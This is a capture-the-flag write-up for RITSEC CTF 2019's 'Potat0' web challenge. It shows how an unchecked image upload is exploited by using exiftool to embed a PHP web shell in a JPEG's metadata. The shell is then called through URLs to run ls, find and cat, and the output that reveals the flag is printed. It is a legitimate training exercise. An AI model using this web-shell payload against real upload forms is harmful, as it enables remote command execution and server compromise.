# RITSEC CTF 2019 – Potat0

* **Category:** web
* **Points:** 158

## Challenge

> http://ctfchallenges.ritsec.club:8003/
>
> Flag format is RS_CTF{}
>
> Author: Pablo Potat0

## Solution

Connecting to the web site, an interesting HTML comment can be discovered.

```html
<article>
<link rel="stylesheet" type="text/css" href="style.css">
<a href="https://facebook.com/groups/RITSEC.group/" target="_blank">
  <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="30px" height="30px" viewBox="0 0 30 30" enable-background="new 0 0 30 30" xml:space="preserve">
   <path id="facebook" fill="#ffffff" d="M17.252,11.106V8.65c0-0.922,0.611-1.138,1.041-1.138h2.643V3.459l-3.639-0.015
	c-4.041,0-4.961,3.023-4.961,4.961v2.701H10v4.178h2.336v11.823h4.916V15.284h3.316l0.428-4.178H17.252z"/>
  </svg>
</a>

<a href="https://instagram.com/_ritsec_" target="_blank">
  <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="30px" height="30px" viewBox="0 0 30 30" enable-background="new 0 0 30 30" xml:space="preserve">
   <path id="instagram" fill="#ffffff" d="M22.107,3.415H7.893c-2.469,0-4.479,2.007-4.479,4.477v4.73v9.486c0,2.469,2.01,4.479,4.479,4.479h14.215
	c2.469,0,4.479-2.01,4.479-4.479v-9.486v-4.73C26.586,5.421,24.576,3.415,22.107,3.415 M23.393,6.086l0.512-0.004v0.511v3.416
	l-3.916,0.014l-0.012-3.928L23.393,6.086z M11.693,12.622c0.742-1.028,1.945-1.7,3.307-1.7s2.564,0.672,3.307,1.7
	c0.484,0.67,0.771,1.49,0.771,2.379c0,2.248-1.828,4.078-4.078,4.078c-2.248,0-4.078-1.83-4.078-4.078
	C10.922,14.112,11.211,13.292,11.693,12.622 M24.328,22.107c0,1.225-0.994,2.219-2.221,2.219H7.893
	c-1.225,0-2.219-0.994-2.219-2.219v-9.486h3.459C8.832,13.356,8.664,14.159,8.664,15c0,3.494,2.842,6.335,6.336,6.335
	s6.336-2.842,6.336-6.335c0-0.842-0.17-1.645-0.467-2.379h3.459V22.107z"/>
  </svg>
</a>
 
  
</a>
<!-- upload and photos not yet linked -->
</article>
```

So you can discover the existence of two more pages:
* [http://ctfchallenges.ritsec.club:8003/upload.php](http://ctfchallenges.ritsec.club:8003/upload.php)
* [http://ctfchallenges.ritsec.club:8003/photos.php](http://ctfchallenges.ritsec.club:8003/photos.php)

Basically the web application allows the upload of an image that will be displayed into a gallery. The upload functionality is vulnerable because it doesn't check the content of the image and it doesn't convert it in order to remove unwanted content.

As a consequence, a [shell](shell.php.jpeg) can be inserted into the image.

```
root@m3ss4p0:~# cp cat.jpeg shell.php.jpeg
root@m3ss4p0:~# exiftool -DocumentName="<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?>" shell.php.jpeg
    1 image files updated
```

The image is renamed, but it can be referenced to execute commands remotely.

```
http://ctfchallenges.ritsec.club:8003/uploads/10_0_0_37.php.jpeg?cmd=ls%20-al%20..

total 44
drwxr-xr-x 3 www-data www-data  4096 Nov 15 13:31 .
drwxr-xr-x 1 root     root      4096 Apr  3  2019 ..
-rw-r--r-- 1 www-data www-data 11321 Apr  3  2019 index.html
-rw-rw-r-- 1 root     root      1713 Nov 15 13:23 index.php
-rwxrwxr-x 1 root     root      2001 Nov 15 13:23 lib.php
-rwxrwxr-x 1 root     root      1871 Nov 15 13:23 photos.php
-rw-rw-r-- 1 root     root       809 Nov 15 13:23 style.css
-rwxrwxr-x 1 root     root      1331 Nov 15 13:23 upload.php
drwxr-xr-x 2 www-data www-data  4096 Nov 15 17:58 uploads



http://ctfchallenges.ritsec.club:8003/uploads/10_0_0_37.php.jpeg?cmd=find%20/%20-name%20flag*%202%3E%20/dev/null

/home/flag.txt
/tmp/npm-6-00351b95/registry.npmjs.org/flagged-respawn
/usr/local/lib/node_modules/gulp/node_modules/flagged-respawn
/usr/local/lib/node_modules/grunt-cli/node_modules/flagged-respawn
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags



http://ctfchallenges.ritsec.club:8003/uploads/10_0_0_37.php.jpeg?cmd=cat%20/home/flag.txt

RS_CTF{FILE_UPLOAD_ISN'T_SECURE}
```

The flag is the following.
```
RS_CTF{FILE_UPLOAD_ISN'T_SECURE}
```